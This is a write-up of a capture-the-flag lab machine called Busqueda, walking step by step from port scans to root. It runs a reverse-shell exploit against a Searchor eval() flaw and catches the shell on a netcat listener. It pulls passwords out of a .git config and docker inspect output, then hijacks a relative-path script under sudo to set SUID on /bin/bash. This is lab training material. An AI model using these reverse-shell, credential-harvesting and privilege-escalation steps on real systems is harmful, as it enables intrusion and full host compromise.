---
layout: default
---


# Busqueda

# Skills

- Information leakage (version)
- .git password leakage
- Docker inspect password leakage
- Code execution as root via relative path

# Enumeration

Scan report two open ports.

```bash
┌──(kali㉿kali)-[~/machines/busqueda/enumeration]
└─$ cat fast_scan 
# Nmap 7.94 scan initiated Mon Sep 18 19:15:45 2023 as: nmap -p- -n -Pn -T4 -oG fast_scan -vvv 10.10.11.208
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.208 ()   Status: Up
Host: 10.10.11.208 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
# Nmap done at Mon Sep 18 19:16:07 2023 -- 1 IP address (1 host up) scanned in 21.41 seconds
```

Now we will launch reconnaissance scripts against this ports.

```bash
┌──(kali㉿kali)-[~/machines/busqueda/enumeration]
└─$ cat specific_scan 
# Nmap 7.94 scan initiated Mon Sep 18 19:16:37 2023 as: nmap -p22,80 -n -Pn -sCV -oN specific_scan 10.10.11.208
Nmap scan report for 10.10.11.208
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 18 19:16:46 2023 -- 1 IP address (1 host up) scanned in 8.55 seconds
```

# PORT 80

Here we can see a web page that allow us to select a search engine and launch a query.

![Untitled](/images/busqueda1.png)

When we perform a search using this service we can see that the URL is reported. Since the framework used is flask maybe we could perform a SSTI.

![Untitled](/images/busqueda2.png)

But the input of the user is correctly sanitized. We could also try to a SSRF modifying the search engine and instead use **localhost** using BurpSuite. However, that won’t work either.

# Foothold

If we take a closer look at the web page we can see that the version of ther service is exposed (**Searchor 2.4.0**), and actually is vulnerable to a RCE due to a bad use of the python **eval()** function.

```bash
┌──(kali㉿kali)-[~/machines/busqueda]
└─$ ./exploit.sh http://searcher.htb/search 10.10.14.17 4444
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is http://searcher.htb/search
[*] Input attacker is 10.10.14.17:4444
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

After this we have a reverse shell in out netcat listener.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                                                                                                  
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.208] 52130
bash: cannot set terminal process group (1665): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
whoami
svc
```

First of all we will get a functional shell to operate with. There are various ways to do this.

```bash
svc@busqueda:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/var/www/app$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg               
[1]  + continued  nc -lnvp 4444
                               reset xterm
```

We export two environmental variables and we are done with this.

```bash
svc@busqueda:/var/www/app$ export TERM=xterm
svc@busqueda:/var/www/app$ export SHELL=bash
```

# Privilege escalation

We start by enumerating our user and current directory.

```bash
svc@busqueda:/var/www/app$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Sep 24 16:39 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

We see a **.gi**t file, which is very interesting, because we can check the full log of the project and check configuration files. Inside this .git file we can see a config file which leaks a password for user cody in a gitea server.

```bash
svc@busqueda:/var/www/app$ cd .git/
svc@busqueda:/var/www/app/.git$ ls
branches        config       HEAD   index  logs     refs
COMMIT_EDITMSG  description  hooks  info   objects
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Actually, this password can be used with our current user to execute **sudo -l** and check what commands we can execute with sudo.

```bash
svc@busqueda:/var/www/app/.git$ sudo -l 
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

When executing the script we can see that actually is used to manage docker containers. We can check which containers are running in the machine.

```bash
svc@busqueda:/opt/scripts$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py safdsf
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:/opt/scripts$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   8 months ago   Up 30 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   8 months ago   Up 30 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

The interesing part is that we can execute ìnspect command from Docker that allows us to get the configuration of a Docker container.

```bash
svc@busqueda:/opt/scripts$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea | grep -iP "password|passwd|pass"
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,
"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"",
"Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2",
"maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

Here we can see that the administrator password of the gitea server is leaked. This allow us to see all his private repositories and the source code of the script **system-checkup.py.** The source code reveals that when using the action full-checkup hte script seeks a bash script in the current directory using a relative path.

![Untitled](/images/busqueda3.png)

We can leverage this to execute a malicious bash script that execute a command as root. Setting our current directory as our home directory we simply have to write a file named **full-checkup.sh**. After, this we execute the **system-checkup.py** script as root from our home directory. The content of **full-checkup.sh** will set the **/bin/bash** binary with the SUID bit.

```bash
#!/bin/bash

chmod u+s /bin/bash
```

After executing **system-checkup.py** as root we will see that bash in the machine is SUID which allow us to become root with the command `bash -p`.

```bash
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```